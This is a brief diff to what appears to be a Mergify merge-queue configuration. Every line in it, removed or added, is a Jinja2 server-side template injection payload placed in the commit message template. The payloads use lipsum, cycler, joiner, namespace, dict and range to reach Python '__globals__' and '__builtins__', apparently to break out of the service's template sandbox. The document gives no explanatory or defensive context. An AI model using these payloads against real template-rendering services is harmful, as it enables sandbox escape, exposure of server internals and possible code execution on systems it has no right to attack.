@@ -4,5 +4,11 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      KEYS: {{ [lipsum]|map(attribute="__globals__")|list|first|items|list }}
-      BUILTINS: {{ [lipsum]|map(attribute="__builtins__")|list }}
+      D1: {{ [lipsum]|map(attribute="__globals__")|list }}
+      D2: {% set ns = namespace(g=[lipsum]|map(attribute="__globals__")|list) %}{{ ns.g }}
+      D3: {% set d = dict() %}{% set _ = d.update({"x": [lipsum]|map(attribute="__globals__")|list}) %}{{ d.x }}
+      D4: {{ [cycler]|map(attribute="__globals__")|list }}
+      D5: {{ [joiner]|map(attribute="__globals__")|list }}
+      D6: {{ [namespace]|map(attribute="__globals__")|list }}
+      D7: {{ [dict]|map(attribute="__globals__")|list }}
+      D8: {{ [range]|map(attribute="__globals__")|list }}
